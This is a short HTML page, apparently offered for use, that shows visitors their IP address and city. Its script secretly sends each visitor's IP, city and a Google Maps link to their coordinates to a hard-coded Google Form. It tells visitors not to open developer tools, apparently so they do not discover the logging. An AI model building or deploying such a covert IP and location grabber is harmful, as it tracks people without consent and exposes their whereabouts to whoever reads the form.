<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Deteksi Lokasi</title>
    <style>
      body {
        font-family: "Segoe UI", sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: #f9f9f9;
        text-align: center;
      }
      .container {
        max-width: 90%;
        width: 500px;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        background: white;
        border-radius: 8px;
      }
      h1 {
        font-size: 1.8em;
        margin-bottom: 10px;
      }
      p {
        font-size: 1em;
        margin: 5px 0;
      }
    </style>
  </head>
  <body>
    <div class="container" id="info">
      <p>Loading...</p>
    </div>

    <script>
      fetch("http://ip-api.com/json")
        .then((res) => res.json())
        .then((data) => {
          const lat = data.lat;
          const lon = data.lon;
          const ip = data.query;
          const city = data.city;
          const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;

          // Kirim ke Google Form (opsional)
          const formURL =
            "https://docs.google.com/forms/d/e/1FAIpQLSfP4SzXDpbenObZjUGxGOnB2gcXRsAXjMFTOvrfTaTczE74eA/formResponse";
          const formData = new FormData();
          formData.append("entry.279686887", ip);
          formData.append("entry.916346022", city);
          formData.append("entry.911657502", mapsURL);

          fetch(formURL, {
            method: "POST",
            mode: "no-cors",
            body: formData,
          });

          // Update konten
          document.getElementById("info").innerHTML = `
          <p>IP: ${ip}</p>
          <p>City: ${city}</p> <br>
          <p>Please do not open the developer tools.</p>
          <p>Â© 2025 SDBS Studio Development</p>
        `;
        });
    </script>
  </body>
</html>
